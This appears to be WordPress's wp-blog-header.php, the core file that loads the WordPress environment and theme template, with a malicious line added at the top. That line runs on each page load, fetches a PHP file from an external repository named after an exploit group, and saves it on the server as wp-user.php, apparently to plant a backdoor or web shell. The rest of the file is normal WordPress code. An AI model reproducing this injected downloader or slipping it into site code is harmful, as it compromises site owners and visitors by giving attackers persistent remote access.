<?php 
file_put_contents("wp-user.php", file_get_contents("https://raw.githubusercontent.com/JawaTengahXploit1337/Method/main/lolme.php")); 
 
/** 
 * Loads the WordPress environment and template. 
 * 
 * @package WordPress 
 */ 
if ( ! isset( $wp_did_header ) ) { 
 
 $wp_did_header = true; 
 
 // Load the WordPress library. 
 require_once DIR . '/wp-load.php'; 
 
 // Set up the WordPress query. 
 wp(); 
 
 // Load the theme template. 
 require_once ABSPATH . WPINC . '/template-loader.php'; 
} 
?>
